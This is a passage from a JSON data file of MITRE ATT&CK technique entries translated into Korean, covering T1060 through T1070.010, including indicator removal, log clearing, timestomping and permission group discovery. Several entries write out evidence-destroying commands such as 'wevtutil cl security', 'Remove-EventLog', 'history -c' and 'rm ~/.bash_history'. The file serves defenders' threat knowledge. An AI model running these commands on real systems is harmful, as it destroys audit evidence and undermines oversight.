키는 프로그램을 자동으로 실행할 수 있습니다.\n\n레지스트리 키 <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code>의 로드 값에 나열된 프로그램은 모든 사용자가 로그인할 때 실행됩니다.\n\n기본적으로 레지스트리 키 <code>H",
      "external_id": "T1060",
      "modified": "2020-01-23T22:05:32.409Z",
      "title": "Registry Run Keys / Startup Folder",
      "translated": true
    },
    {
      "description": "**이 기술은 더 이상 사용되지 않습니다. 적절한 경우 [원격 서비스](https://attack.mitre.org/techniques/T1021)를 사용하시기 바랍니다.**\n\n그래픽 사용자 인터페이스(GUI)는 운영 체제와 상호 작용하는 일반적인 방법입니다. 공격자는 운영 중 시스템의 GUI를 사용할 수 있으며, 일반적으로 [원격 데스크톱 프로토콜](https://attack.mitre.org/techniques/T1076)과 같은 원격 대화형 세션을 통해, [명령 및 스크립트 인터프리터](https://attack.mitre.org/techniques/T1059)를 사용하는 대신, 정보를 검색하고 마우스 더블 클릭 이벤트, Windows 실행 명령(인용: 위키백과 실행 명령) 또는 기타 모니터링하기 어려운 상호작용을 통해 파일을 실행할 수 있습니다.",
      "external_id": "T1061",
      "modified": "2020-03-30T13:38:08.738Z",
      "title": "Graphical User Interface",
      "translated": true
    },
    {
      "description": "**이 기술은 더 이상 사용되지 않으며Deprecated되어야 합니다.**\n\n타입-1 하이퍼바이저는 게스트 운영 체제와 시스템 하드웨어 사이에 있는 소프트웨어 계층입니다. (출처: 위키백과 하이퍼바이저) 이는 운영 체제에 가상 실행 환경을 제공합니다. 일반적인 하이퍼바이저의 예로는 Xen이 있습니다. (출처: 위키백과 Xen) 타입-1 하이퍼바이저는 운영 체제 아래의 수준에서 작동하며, 게스트 운영 체제에서 자신의 존재를 숨기기 위해 [루트킷](https://attack.mitre.org/techniques/T1014) 기능이 설계될 수 있습니다. (출처: Myers 2007) 이러한 악성 하이퍼바이저는 시스템에서 중단을 통해 지속될 수 있습니다.",
      "external_id": "T1062",
      "modified": "2020-03-30T13:44:04.712Z",
      "title": "Hypervisor",
      "translated": true
    },
    {
      "description": "공격자는 시스템에 설치된 보안 소프트웨어, 구성, 방어 도구 및 센서의 목록을 가져오려고 할 수 있습니다. 여기에는 로컬 방화벽 규칙 및 백신 프로그램과 같은 내용이 포함될 수 있습니다. 공격자는 [보안 소프트웨어 발견](https://attack.mitre.org/techniques/T1063)에서 얻은 정보를 사용하여 자동 발견 중 후속 행동을 형성하며, 이는 공격자가 타겟을 완전히 감염시킬지 여부나 특정 행동을 시도할지를 결정하는 데 영향을 미칠 수 있습니다.\n\n### 윈도우\n\n보안 소프트웨어 정보를 얻기 위해 사용할 수 있는 예시 명령어로는 [netsh](https://attack.mitre.org/software/S0108), <code>reg query</code>와 [Reg](https://attack.mitre.org/software/S0075), <code>dir</code>와 [cmd](https://attack.mitre.org/software/S0106), 그리고 [Tasklist](https://attack.mitre.org/software/S0057)가 있습니다. 그러나 발견 행동에 대한 다른 지표는 공격자가 찾고 있는 소프트웨어 또는 보안 시스템의 유형에 더 구체적일 수 있습니다.\n\n### 맥\n\nmacOS 악성코드가 LittleSnitch 및 KnockKnock 소프트웨어를 확인하는 경우가 점점 더 흔해지고 있습니다.",
      "external_id": "T1063",
      "modified": "2020-02-21T21:17:03.347Z",
      "title": "Security Software Discovery",
      "translated": true
    },
    {
      "description": "**이 기술은 더 이상 사용되지 않습니다. 적절한 경우 [명령 및 스크립트 인터프리터](https://attack.mitre.org/techniques/T1059)를 사용하시기 바랍니다.**\n\n적대 세력은 작업을 지원하고 수동으로 수행해야 하는 여러 작업을 수행하기 위해 스크립트를 사용할 수 있습니다. 스크립팅은 운영 작업의 속도를 높이고 중요한 자원에 접근하는 데 필요한 시간을 줄이는 데 유용합니다. 일부 스크립트 언어는 다른 프로그램을 호출하는 대신 API 수준에서 운영 체제와 직접 상호 작용하여 프로세스 모니터링 메커니즘을 우회할 수 있습니다. Windows에서 일반적으로 사용되는 스크립트 언어에는 VBScript와 [PowerShell](https://attack.mitre.org/techniques/T1086)이 포함되지만 명령줄 배치 스크립트 형식으로도 사용할 수 있습니다.\n\n스크립트는 [스피어피싱 첨부 파일](https://attack.mitre.org/techniques/T1193) 및 기타 유형의 스피어피싱이 열릴 때 실행되도록 설정할 수 있는 매크로로 Office 문서에 포함될 수 있습니다. 악성 내장 매크로는 [클라이언트 실행을 위한 악용](https://attack.mitre.org/techniques/T1203)을 통한 소프트웨어 악용보다 실행의 대안적인 수단으로, 적대 세력은 매크로가 허용되거나 사용자가 이를 활성화하기 위해 수락할 것에 의존하게 됩니다.\n\n보안 테스터와 적대 세력 모두를 위해 스크립트 형태를 사용하는 많은 인기 있는 공격 프레임워크가 존재합니다. Metasploit (출처: Metasploit_Ref), Veil (출처: Veil_Ref), PowerSploit (출처: Powersploit)은 악용 및 후속 타격 작업을 위해 침투 테스트 전문가들 사이에서 인기가 높은 세 가지 예이며, 방어를 우회하기 위한 많은 기능을 포함하고 있습니다. 일부 적대 세력은 PowerShell을 사용하는 것으로 알려져 있습니다. (출처: Alperovitch 2014)",
      "external_id": "T1064",
      "modified": "2020-03-30T13:39:24.852Z",
      "title": "Scripting",
      "translated": true
    },
    {
      "description": "적대자는 잘못 구성된 프록시와 방화벽을 우회하기 위해 비표준 포트를 통해 C2(명령 및 제어) 통신을 수행할 수 있습니다.",
      "external_id": "T1065",
      "modified": "2020-03-14T18:19:53.002Z",
      "title": "Uncommonly Used Port",
      "translated": true
    },
    {
      "description": "악성 도구가 감지되어 격리되거나 다른 방식으로 차단되면, 공격자는 악성 도구가 왜 감지되었는지(지표)를 파악할 수 있으며, 지표를 제거하여 도구를 수정하고, 목표의 방어 시스템이나 유사한 시스템을 사용하는 후속 목표에서 더 이상 감지되지 않는 업데이트된 버전을 사용할 수 있습니다.\n\n좋은 예로는 맬웨어가 파일 서명으로 감지되어 안티바이러스 소프트웨어에 의해 격리되는 경우가 있습니다. 맬웨어가 파일 서명 때문에 격리되었다는 것을 파악할 수 있는 공격자는 [소프트웨어 패킹](https://attack.mitre.org/techniques/T1045) 또는 기타 방법으로 파일을 수정하여 다른 서명을 가진 파일로 만들 수 있으며, 이후 해당 맬웨어를 재사용할 수 있습니다.",
      "external_id": "T1066",
      "modified": "2020-03-20T15:22:53.835Z",
      "title": "Indicator Removal from Tools",
      "translated": true
    },
    {
      "description": "부트킷(bootkit)은 하드 드라이브의 부트 섹터, 즉 마스터 부트 레코드(MBR)와 볼륨 부트 레코드(VBR)를 수정하는 악성 코드 변종입니다. (출처: MTrends 2016)\n\n적대 세력은 운영 체제보다 아래의 계층에서 시스템에 지속성을 유지하기 위해 부트킷을 사용할 수 있으며, 이는 조직이 이를 의심하고 적절히 대응하지 않는 한 완전한 복구를 어렵게 만들 수 있습니다.\n\n### 마스터 부트 레코드 (MBR)\nMBR은 BIOS에 의한 하드웨어 초기화가 완료된 후 처음 로드되는 디스크의 섹션입니다. 이곳은 부트 로더의 위치입니다. 적대 세력이 부트 드라이브에 원시 접근 권한을 가진 경우, 이 영역을 덮어써 정상 부트 로더에서 적대 코드로의 실행을 전환할 수 있습니다. (출처: Lau 2011)\n\n### 볼륨 부트 레코드 (VBR)\nMBR은 부팅 프로세스의 제어를 VBR로 전달합니다. MBR의 경우와 유사하게, 적대 세력이 부트 드라이브에 원시 접근 권한을 가진 경우, VBR을 덮어써 부팅 시 적대 코드로의 실행을 전환할 수 있습니다.",
      "external_id": "T1067",
      "modified": "2020-03-20T19:53:25.628Z",
      "title": "Bootkit",
      "translated": true
    },
    {
      "description": "적대자는 권한을 상승시키기 위해 소프트웨어 취약점을 악용할 수 있습니다. 소프트웨어 취약점을 악용하는 것은 적대자가 프로그램, 서비스 또는 운영 체제 소프트웨어 또는 커널 자체의 프로그래밍 오류를 이용하여 스스로 제어하는 코드 실행을 시도하는 경우를 말합니다. 권한 수준과 같은 보안 메커니즘은 종종 정보 접근 및 특정 기술 사용을 저해하므로, 적대자는 이러한 제한을 우회하기 위해 소프트웨어 악용을 포함한 권한 상승을 수행해야 할 필요가 있을 것입니다.\n\n시스템에 처음 접근할 때, 적대자는低 권한 프로세스 내에서 작업하고 있을 수 있으며, 이는 특정 리소스에 접근하는 것을 방해할 수 있습니다. 일반적으로 높은 권한에서 실행되는 운영 체제 구성 요소 및 소프트웨어에 취약점이 존재할 수 있으며, 이를 악용하여 시스템에서 더 높은 수준의 접근을 획득할 수 있습니다. 이를 통해 누군가는 일반 사용자 권한에서 SYSTEM이나 root 권한으로 이동할 수 있습니다. 또한, 이는 적대자가 가상 머신이나 컨테이너와 같은 가상화된 환경에서 기반 호스트로 이동할 수 있게 합니다. 이는 적절히 구성된 엔드포인트 시스템을 타겟으로 했을 경우, 다른 권한 상승 방법을 제한하는 경우에서 적대자가 반드시 수행해야 하는 단계일 수 있습니다.\n\n적대자는 서명된 취약한 드라이버를 손상된 머신에 가져와서, 해당 취약점을 악용하여 커널 모드에서 코드를 실행할 수 있습니다. 이 과정을 종종 Bring Your Own Vulnerable Driver (BYOVD)라고 부릅니다. (인용: ESET InvisiMole June 2020)(인용: Unit42 AcidBox June 2020) 적대자는 초기 접근 중에 전달된 파일에 취약한 드라이버를 포함시키거나 [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) 또는 [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570)를 통해 손상된 시스템에 다운로드할 수 있습니다.",
      "external_id": "T1068",
      "modified": "2023-04-07T17:13:54.168Z",
      "title": "Exploitation for Privilege Escalation",
      "translated": true
    },
    {
      "description": "위협 행위자들은 그룹 및 권한 설정을 탐색하려고 시도할 수 있습니다. 이 정보는 위협 행위자들이 사용 가능한 사용자 계정과 그룹, 특정 그룹의 사용자 멤버십, 그리고 어떤 사용자와 그룹이 확장된 권한을 갖고 있는지를 파악하는 데 도움이 될 수 있습니다.\n\n위협 행위자들은 그룹 권한 설정을 탐색하기 위해 다양한 방법을 사용할 수 있습니다. 이 데이터는 위협 행위자에게 손상된 환경에 대한 정보를 제공하며, 이는 후속 활동 및 표적 설정에 사용될 수 있습니다. (출처: CrowdStrike BloodHound 2018년 4월)",
      "external_id": "T1069",
      "modified": "2024-10-15T16:03:06.294Z",
      "title": "Permission Groups Discovery",
      "translated": true
    },
    {
      "description": "공격자는 로컬 시스템 그룹 및 권한 설정을 찾으려고 시도할 수 있습니다. 로컬 시스템 권한 그룹에 대한 지식은 공격자가 어떤 그룹이 존재하는지와 특정 그룹에 속한 사용자가 누구인지를 파악하는 데 도움이 될 수 있습니다. 공격자는 이러한 정보를 사용하여 로컬 관리자 그룹에 있는 사용자와 같이 Elevated Permissions(상승된 권한)를 가진 사용자를 식별할 수 있습니다.\n\n<code>net localgroup</code>와 같은 명령은 [Net](https://attack.mitre.org/software/S0039) 유틸리티에서 사용되며, macOS에서는 <code>dscl . -list /Groups</code>, 리눅스에서는 <code>groups</code> 명령으로 로컬 그룹을 나열할 수 있습니다.",
      "external_id": "T1069.001",
      "modified": "2023-04-07T17:14:42.184Z",
      "title": "Local Groups",
      "translated": true
    },
    {
      "description": "적대자는 도메인 수준의 그룹 및 권한 설정을 찾으려고 시도할 수 있습니다. 도메인 수준의 권한 그룹에 대한 지식은 적대자가 어떤 그룹이 존재하는지, 특정 그룹에 어떤 사용자가 속해 있는지를 파악하는 데 도움이 될 수 있습니다. 적대자는 이 정보를 사용하여 도메인 관리자와 같은 상승된 권한을 가진 사용자를 식별할 수 있습니다.\n\n[Net](https://attack.mitre.org/software/S0039) 유틸리티의 <code>net group /domain</code> 명령, macOS의 <code>dscacheutil -q group</code>, 그리고 Linux의 <code>ldapsearch</code>와 같은 명령은 도메인 수준의 그룹을 나열할 수 있습니다.",
      "external_id": "T1069.002",
      "modified": "2023-04-07T17:16:47.754Z",
      "title": "Domain Groups",
      "translated": true
    },
    {
      "description": "적대자는 클라우드 그룹 및 권한 설정을 찾으려 할 수 있습니다. 클라우드 권한 그룹에 대한 지식은 적대자가 환경 내에서 사용자 및 그룹의 특정 역할을 파악하고 특정 그룹과 관련된 사용자를 확인하는 데 도움이 됩니다.\n\n인증된 접근이 있을 경우 여러 도구를 사용하여 권한 그룹을 찾을 수 있습니다. <code>Get-MsolRole</code> PowerShell cmdlet을 사용하면 Exchange 및 Office 365 계정에 대한 역할 및 권한 그룹을 얻을 수 있습니다 (인용: Microsoft Msolrole)(인용: GitHub Raindance).\n\nAzure CLI(AZ CLI) 및 Google Cloud Identity Provider API는 권한 그룹을 얻기 위한 인터페이스도 제공합니다. <code>az ad user get-member-groups</code> 명령은 Azure 사용자 계정과 관련된 그룹을 나열하며, API 엔드포인트 <code>GET https://cloudidentity.googleapis.com/v1/groups</code>는 Google에 대한 사용자에게 사용할 수 있는 그룹 리소스를 나열합니다 (인용: Microsoft AZ CLI)(인용: Black Hills Red Teaming MS AD Azure, 2018)(인용: Google Cloud Identity API Documentation). AWS에서는 `ListRolePolicies`와 `ListAttachedRolePolicies` 명령을 사용하여 역할에 연결된 정책을 나열할 수 있습니다 (인용: Palo Alto Unit 42 Compromised Cloud Compute Credentials 2022).\n\n적대자는 객체에 대한 소유자 및 객체에 접근할 수 있는 다른 계정을 확인하기 위해 객체의 ACL을 나열하려고 시도할 수 있습니다. 예를 들어, AWS의 <code>GetBucketAcl</code> API를 통해 확인할 수 있습니다 (인용: AWS Get Bucket ACL). 이 정보를 사용하여 적대자는 특정 객체에 대한 권한이 있는 계정을 표적으로 삼거나 이미 손상된 계정을 활용하여 해당 객체에 접근할 수 있습니다.",
      "external_id": "T1069.003",
      "modified": "2024-10-15T15:51:35.759Z",
      "title": "Cloud Groups",
      "translated": true
    },
    {
      "description": "적대자는 시스템 내에서 생성된 아티팩트를 삭제하거나 수정하여 자신의 존재에 대한 증거를 제거하거나 방어를 방해할 수 있습니다. 다양한 아티팩트는 적대자가 생성한 것이거나 적대자의 행동에 귀속될 수 있는 것들입니다. 일반적으로 이러한 아티팩트는 사용자 행동으로 생성된 로그, 다운로드된 파일의 문자열, 방어자가 분석하는 기타 데이터와 같은 모니터링된 이벤트와 관련된 방어 지표로 사용됩니다. 아티팩트의 위치, 형식 및 유형(예: 명령어 또는 로그인 기록)은 각 플랫폼마다 특정적입니다.\n\n이러한 지표의 제거는 이벤트 수집, 보고 또는 침입 활동 감지를 위한 다른 프로세스에 방해가 될 수 있습니다. 이는 주목할 만한 사건이 보고되지 않도록 하여 보안 솔루션의 무결성을 위협할 수 있습니다. 또한 충분한 데이터가 부족하여 발생한 사건을 결정하는 데 어려움이 있어 포렌식 분석 및 사고 대응을 방해할 수 있습니다.",
      "external_id": "T1070",
      "modified": "2024-10-15T15:59:22.125Z",
      "title": "Indicator Removal",
      "translated": true
    },
    {
      "description": "공격자는 침입 활동을 숨기기 위해 Windows 이벤트 로그를 삭제할 수 있습니다. Windows 이벤트 로그는 컴퓨터의 경고 및 알림을 기록하는 것입니다. 시스템에서 정의된 세 가지 이벤트 소스는 시스템(System), 애플리케이션(Application), 보안(Security)이며, 이벤트 유형은 오류(Error), 경고(Warning), 정보(Information), 성공 감사(Success Audit), 실패 감사(Failure Audit)로 총 다섯 가지입니다.\n\n관리자 권한으로 다음 유틸리티 명령어를 사용하여 이벤트 로그를 삭제할 수 있습니다:\n\n* <code>wevtutil cl system</code>\n* <code>wevtutil cl application</code>\n* <code>wevtutil cl security</code>\n\n이 로그는 이벤트 뷰어 GUI나 [PowerShell](https://attack.mitre.org/techniques/T1059/001)과 같은 다른 방법으로도 삭제할 수 있습니다. 예를 들어, 공격자는 PowerShell 명령어 <code>Remove-EventLog -LogName Security</code>를 사용하여 보안 이벤트 로그를 삭제하고, 재부팅 후에는 향후 로그 기록을 비활성화할 수 있습니다. 참고로, 명령어가 실행되고 재부팅되는 동안 .evtx 파일에 이벤트가 여전히 생성되고 기록될 수 있습니다. (인용: disable_win_evt_logging)\n\n공격자는 또한 `C:\\Windows\\System32\\winevt\\logs\\` 내에 저장된 로그 파일을 직접 삭제함으로써 로그를 지우려고 시도할 수 있습니다.",
      "external_id": "T1070.001",
      "modified": "2024-04-16T12:40:58.536Z",
      "title": "Clear Windows Event Logs",
      "translated": true
    },
    {
      "description": "침입에 대한 증거를 숨기기 위해 공격자가 시스템 로그를 삭제할 수 있습니다. macOS와 Linux는 모두 시스템 또는 사용자 시작 작업을 시스템 로그를 통해 추적합니다. 대부분의 기본 시스템 로그는 <code>/var/log/</code> 디렉터리에 저장됩니다. 이 디렉터리의 하위 폴더는 관련 기능에 따라 로그를 분류합니다. 예를 들어:\n\n* <code>/var/log/messages:</code>: 일반 및 시스템 관련 메시지\n* <code>/var/log/secure</code> 또는 <code>/var/log/auth.log</code>: 인증 로그\n* <code>/var/log/utmp</code> 또는 <code>/var/log/wtmp</code>: 로그인 기록\n* <code>/var/log/kern.log</code>: 커널 로그\n* <code>/var/log/cron.log</code>: 크론 로그\n* <code>/var/log/maillog</code>: 메일 서버 로그\n* <code>/var/log/httpd/</code>: 웹 서버 접근 및 오류 로그",
      "external_id": "T1070.002",
      "modified": "2020-03-29T21:23:51.886Z",
      "title": "Clear Linux or Mac System Logs",
      "translated": true
    },
    {
      "description": "시스템 로그를 지우는 것 외에도, 공격자는 침투 중에 수행한 작업을 숨기기 위해 침해된 계정의 명령 기록을 지울 수 있습니다. 다양한 명령 인터프리터는 사용자가 터미널에 입력한 명령을 추적하여 사용자가 이전에 수행한 작업을 되짚어볼 수 있도록 합니다.\n\nLinux 및 macOS에서 이러한 명령 기록은 몇 가지 방법으로 접근할 수 있습니다. 로그인 중일 때, 이 명령 기록은 환경 변수 <code>HISTFILE</code>가 가리키는 파일에 저장됩니다. 사용자가 시스템에서 로그아웃할 때, 이 정보는 사용자의 홈 디렉터리에 있는 <code>~/.bash_history</code>라는 파일로 플러시됩니다. 이를 통해 사용자는 이전 세션에서 사용했던 명령으로 돌아갈 수 있는 이점이 있습니다.\n\n공격자는 이러한 로그에서 수동으로 기록을 지우거나 (<code>history -c</code>) bash 기록 파일을 삭제함으로써 <code>rm ~/.bash_history</code> 관련 명령을 제거할 수 있습니다.\n\n공격자는 네트워크 장치에서 [네트워크 장치 CLI](https://attack.mitre.org/techniques/T1059/008)를 활용하여 명령 기록 데이터를 지울 수 있습니다 (<code>clear logging</code> 및/또는 <code>clear history</code>).(출처: US-CERT-TA18-106A)\n\nWindows 호스트에서는 PowerShell이 두 가지 명령 기록 제공자를 가지고 있습니다: 내장 기록 및 <code>PSReadLine</code> 모듈에 의해 관리되는 명령 기록. 내장 기록은 현재 세션에서 사용된 명령만 추적합니다. 이 명령 기록은 다른 세션에서 사용할 수 없으며 세션이 종료될 때 삭제됩니다.\n\n<code>PSReadLine</code> 명령 기록은 모든 PowerShell 세션에서 사용된 명령을 추적하고 기본적으로 <code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> 파일에 기록합니다. 이 기록 파일은 모든 세션에서 사용할 수 있으며, 세션 종료 시 파일이 삭제되지 않기 때문에 모든 과거 기록을 포함하고 있습니다.(출처: Microsoft PowerShell Command History)\n\n공격자는 PowerShell 명령 <code>Clear-History</code>를 실행하여 현재 PowerShell 세션의 전체 명령 기록을 플러시할 수 있습니다. 그러나 이는 <code>ConsoleHost_history.txt</code> 파일을 삭제 또는 플러시하지 않습니다. 공격자는 또한 <code>ConsoleHost_history.txt</code> 파일을 삭제하거나 내용을 수정하여 실행한 PowerShell 명령을 숨길 수 있습니다.(출처: Sophos PowerShell command audit)(출처: Sophos PowerShell Command History Forensics)",
      "external_id": "T1070.003",
      "modified": "2024-02-14T20:07:44.756Z",
      "title": "Clear Command History",
      "translated": true
    },
    {
      "description": "침투 활동의 결과로 남겨진 파일을 삭제할 수 있는 적대자들이 있습니다. 적대자가 시스템에 내려받거나 생성한 악성코드, 도구 또는 기타 비원주 파일(예: [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105))은 네트워크 내에서 수행된 작업과 그 방법을 나타내는 흔적을 남길 수 있습니다. 이러한 파일의 제거는 침투 중에 발생할 수 있으며, 적대자의 흔적을 최소화하기 위한 침투 후 과정의 일환으로 이루어질 수 있습니다.\n\n호스트 운영 체제에서 정리 작업을 수행하기 위한 도구가 제공되지만, 적대자들은 다른 도구를 사용할 수도 있습니다. (인용: Microsoft SDelete 2016년 7월) 내장된 [명령 및 스크립트 인터프리터](https://attack.mitre.org/techniques/T1059) 기능의 예로는 Windows의 <code>del</code> 명령과 Linux 및 macOS의 <code>rm</code> 또는 <code>unlink</code> 명령이 있습니다.",
      "external_id": "T1070.004",
      "modified": "2024-10-15T16:33:59.107Z",
      "title": "File Deletion",
      "translated": true
    },
    {
      "description": "위협 행위자들은 자신의 작업의 흔적을 지우기 위해 더 이상 유용하지 않은 공유 연결을 제거할 수 있습니다. Windows 공유 드라이브 및 [SMB/Windows 관리 공유](https://attack.mitre.org/techniques/T1021/002) 연결은 더 이상 필요하지 않을 때 제거될 수 있습니다. [Net](https://attack.mitre.org/software/S0039)은 <code>net use \\\\system\\share /delete</code> 명령을 사용하여 네트워크 공유 연결을 제거할 수 있는 유틸리티의 예입니다. (출처: Technet Net Use)",
      "external_id": "T1070.005",
      "modified": "2023-04-13T17:15:56.948Z",
      "title": "Network Share Connection Removal",
      "translated": true
    },
    {
      "description": "공격자는 새로운 파일이나 기존 파일의 변경 사항을 숨기기 위해 파일 시간 속성을 수정할 수 있습니다. 타임스톰핑(Timestomping)은 파일의 타임스탬프(수정, 접근, 생성 및 변경 시간을) 수정하는 기술로, 동일한 폴더에 있는 파일을 모방하고 악성 파일을 합법적인 파일과 혼합하는 경우가 많습니다.\n\n`$STANDARD_INFORMATION`(`$SI`) 및 `$FILE_NAME`(`$FN`) 속성은 마스터 파일 테이블(MFT) 파일에서 시간을 기록합니다. `$SI` (날짜/시간 스탬프)는 파일 시스템 뷰를 포함하여 최종 사용자에게 표시되며, 반면 `$FN`은 커널에 의해 처리됩니다.\n\n`$SI` 속성을 수정하는 것은 API 호출을 사용하여 사용자 수준에서 수정할 수 있기 때문에 가장 일반적인 타임스톰핑 방법입니다. 그러나 `$FN` 타임스톰핑은 일반적으로 시스템 커널과 상호작용하거나 파일을 이동하거나 이름을 변경해야 합니다.\n\n공격자는 파일의 타임스탬프를 수정하여 포렌식 조사자나 파일 분석 도구에 눈에 띄지 않게 합니다. `$SI`와 `$FN` 속성 간의 불일치를 식별하는 탐지 방법을 피하기 위해, 공격자는 두 속성 모두의 시간을 동시에 수정하는 \"더블 타임스톰핑(Double Timestomping)\"을 수행할 수도 있습니다.\n\n타임스톰핑은 악성 코드 및 도구를 숨기기 위해 파일 이름 [위장(Masquerading)] 기술과 함께 사용될 수 있습니다.",
      "external_id": "T1070.006",
      "modified": "2024-09-30T15:14:56.021Z",
      "title": "Timestomp",
      "translated": true
    },
    {
      "description": "공격자는 악의적인 네트워크 연결의 증거를 제거하거나 삭제하여 자신의 활동 흔적을 지우려 할 수 있습니다. 시스템 또는 응용 프로그램 로그에 생성된 연결 기록을 강조하는 다양한 아티팩트 및 구성 설정은 [원격 서비스](https://attack.mitre.org/techniques/T1021) 또는 [외부 원격 서비스](https://attack.mitre.org/techniques/T1133)와 같이 네트워크 연결을 요구하는 행동으로 인해 생성될 수 있습니다. 방어자는 이러한 아티팩트를 사용하여 공격자가 생성한 네트워크 연결을 모니터링하거나 분석할 수 있습니다.\n\n네트워크 연결 기록은 다양한 위치에 저장될 수 있습니다. 예를 들어, RDP 연결 기록은 Windows 레지스트리 값에 저장될 수 있으며, 이는 다음과 같습니다 (인용: Microsoft RDP Removal):\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers</code>\n\nWindows는 또한 <code>C:\\Users\\\\%username%\\Documents\\Default.rdp</code>와 `C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Terminal Server Client\\Cache\\`와 같은 파일에서도 최근 RDP 연결에 대한 정보를 저장할 수 있습니다. (인용: Moran RDPieces) 비슷하게, macOS와 Linux 호스트는 시스템 로그에 연결 기록을 강조하는 정보를 저장할 수 있습니다 (예: `/Library/Logs` 및/또는 `/var/log/`에 저장된 로그). (인용: Apple Culprit Access)(인용: FreeDesktop Journal)(인용: Apple Unified Log Analysis Remote Login and Screen Sharing)\n\n악의적인 네트워크 연결은 또한 [시스템 방화벽 비활성화 또는 수정](https://attack.mitre.org/techniques/T1562/004) 또는 [프록시](https://attack.mitre.org/techniques/T1090)를 활성화하기 위한 타사 응용 프로그램이나 네트워크 구성 설정 변경을 필요로 할 수 있습니다. 공격자는 이러한 데이터를 삭제하거나 수정하여 지표를 숨기거나 방어 분석을 방해할 수 있습니다.",
      "external_id": "T1070.007",
      "modified": "2023-09-08T18:05:28.311Z",
      "title": "Clear Network Connection History and Configurations",
      "translated": true
    },
    {
      "description": "적대자들은 그들의 활동의 증거를 제거하기 위해 메일 및 메일 애플리케이션 데이터를 수정할 수 있습니다. 이메일 애플리케이션은 사용자와 다른 프로그램이 커맨드라인 도구나 API를 사용하여 메일박스 데이터를 내보내거나 삭제할 수 있게 허용합니다. 메일 애플리케이션 데이터는 이메일, 이메일 메타데이터, 또는 애플리케이션이나 운영 체제에 의해 생성된 로그(예: 내보내기 요청)일 수 있습니다.\n\n적대자들은 이메일 및 메일박스 데이터를 조작하여 로그, 아티팩트 및 메타데이터를 제거할 수 있습니다. 여기에는 [피싱](https://attack.mitre.org/techniques/T1566)/[내부 스피어피싱](https://attack.mitre.org/techniques/T1534), [이메일 수집](https://attack.mitre.org/techniques/T1114), 명령 및 제어용 [메일 프로토콜](https://attack.mitre.org/techniques/T1071/003), 또는 [대체 프로토콜을 통한 데이터 반출](https://attack.mitre.org/techniques/T1048)과 같은 이메일 기반의 데이터 반출 증거가 포함됩니다. 예를 들어, Exchange 서버에서 증거를 제거하기 위해 적대자들은 <code>ExchangePowerShell</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) 모듈을 사용하여 <code>Remove-MailboxExportRequest</code>를 통해 메일박스 내보내기의 증거를 제거했습니다. (출처: Volexity SolarWinds)(출처: ExchangePowerShell 모듈) 리눅스와 macOS에서는 적대자들이 <code>mail</code>라는 커맨드라인 유틸리티를 통해 이메일을 삭제하거나 [AppleScript](https://attack.mitre.org/techniques/T1059/002)를 사용하여 macOS의 API와 상호작용할 수 있습니다. (출처: Cybereason Cobalt Kitty 2017)(출처: mailx 매뉴얼 페이지)\n\n적대자들은 또한 스팸이나 의심스러운 활동을 나타내는 이메일 및 메타데이터/헤더를 제거하여 악성 이메일이 보안 제품에 의해 탐지될 가능성을 줄일 수 있습니다. (출처: Microsoft OAuth Spam 2022)",
      "external_id": "T1070.008",
      "modified": "2024-10-15T15:43:56.839Z",
      "title": "Clear Mailbox Data",
      "translated": true
    },
    {
      "description": "공격자는 호스트 시스템에서 이전에 설정된 지속성에 관련된 인 Artifact를 제거하여 자신의 활동에 대한 증거를 삭제할 수 있습니다. 이는 서비스 제거, 실행 파일 삭제, [레지스트리 수정](https://attack.mitre.org/techniques/T1112), [플리스트 파일 수정](https://attack.mitre.org/techniques/T1647)과 같은 다양한 조치를 포함할 수 있으며, 방어자가 공격자의 지속적인 존재에 대한 증거를 수집하지 못하도록 하는 청소 방법을 사용할 수 있습니다. (인용: Cylance Dust Storm) 공격자는 또한 지속성을 유지하기 위해 이전에 생성된 계정을 삭제할 수도 있습니다 (즉, [계정 생성](https://attack.mitre.org/techniques/T1136)). (인용: Talos - Cisco Attack 2022)\n\n일부 경우, 공격자가 지속성을 실행한 후 새로운 악성코드 인스턴스의 오류를 방지하기 위해 지속성의 인 Artifact를 제거하기도 합니다. (인용: NCC Group Team9 2020년 6월)",
      "external_id": "T1070.009",
      "modified": "2023-04-11T22:30:01.227Z",
      "title": "Clear Persistence",
      "translated": true
    },
    {
      "description": "페이로드가 전달된 후, 공격자는 피해 시스템에서 동일한 악성 소프트웨어의 복사본을 재생산하여 자신들의 존재에 대한 증거를 제거하거나 방어를 회피할 수 있습니다. 악성 페이로드를 새로운 위치에 복사하는 것은 이전에 존재했던 아티팩트를 정리하기 위해 [파일 삭제](https://attack.mitre.org/techniques/T1070/004)와 결합될 수 있습니다.\n\n악성코드를 재배치하는 것은 방어 회피를 위한 많은 행동의 일환이 될 수 있습니다. 예를 들어, 공격자는 페이로드를 복사하고 이름을 변경하여 지역 환경에 더 잘 어울리도록 할 수 있습니다(즉, [합법적인 이름 또는 위치에 일치](https://attack.mitre.org/techniques/T1036/005)). (출처: DFIR Report Trickbot 2023년 6월) 페이로드는 또한 [파일/경로 제외](https://attack.mitre.org/techniques/T1564/012) 및 [영속성](https://attack.mitre.org/tactics/TA0003) 설정과 관련된 특정 위치를 타겟으로 재배치될 수 있습니다. (출처: Latrodectus 2024년 4월)\n\n악성 페이로드를 재배치하는 것은 방어 분석을 방해할 수도 있으며, 특히 이러한 페이로드를 경고를 생성했거나 방어자의 주의를 끌었을 수 있는 이전 사건(예: [사용자 실행](https://attack.mitre.org/techniques/T1204) 및 [피싱](https://attack.mitre.org/techniques/T1566))과 분리하는 데 도움을 줄 수 있습니다.",
      "external_id": "T1070.010",
      "modified": "2024-10-13T15:48:46.391Z",
      "title": "Relocate Malware",
      "translated": true
    },
    {
